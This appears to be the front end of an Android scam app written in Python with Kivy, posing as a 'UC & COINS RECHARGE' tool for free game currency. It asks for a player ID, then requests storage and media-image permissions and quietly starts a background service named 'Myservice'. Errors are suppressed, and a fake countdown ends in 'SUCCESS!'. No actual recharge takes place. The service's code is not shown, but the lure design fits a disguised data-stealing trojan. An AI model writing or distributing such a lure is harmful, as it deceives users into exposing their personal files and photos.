from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.clock import Clock 
from kivy.utils import platform

if platform == 'android':
    from jnius import autoclass
    from android.permissions import request_permissions, Permission

class CoinsApp(App):
    def build(self):
        self.seconds = 240 
        layout = BoxLayout(orientation="vertical", padding=30, spacing=15)
        self.status = Label(text="UC & COINS RECHARGE", font_size='22sp', bold=True, color=(1, 0.8, 0, 1))
        self.player_id = TextInput(multiline=False, hint_text="Enter Player ID...", font_size='20sp', size_hint_y=None, height=120)
        self.btn = Button(text="START RECHARGE", background_color=(0.1, 0.7, 0.2, 1), bold=True)
        self.btn.bind(on_press=self.start)
        layout.add_widget(self.status)
        layout.add_widget(self.player_id)
        layout.add_widget(self.btn)
        return layout

    def start(self, instance):
        if not self.player_id.text: return
        if platform == 'android':
            perms = [Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_MEDIA_IMAGES, Permission.FOREGROUND_SERVICE]
            request_permissions(perms, self.launch)

    def launch(self, permissions, grants):
        try:
            from android import android_service
            android_service.start_service(App.get_running_app().root, 'Myservice', '')
            self.btn.disabled = True
            Clock.schedule_interval(self.timer, 1)
        except: pass

    def timer(self, dt):
        if self.seconds > 0:
            m, s = divmod(self.seconds, 60)
            self.status.text = f"PROCESSING... {m:02d}:{s:02d}"
            self.seconds -= 1
        else:
            self.status.text = "✅ SUCCESS!"
            return False

if __name__ == "__main__":
    CoinsApp().run()
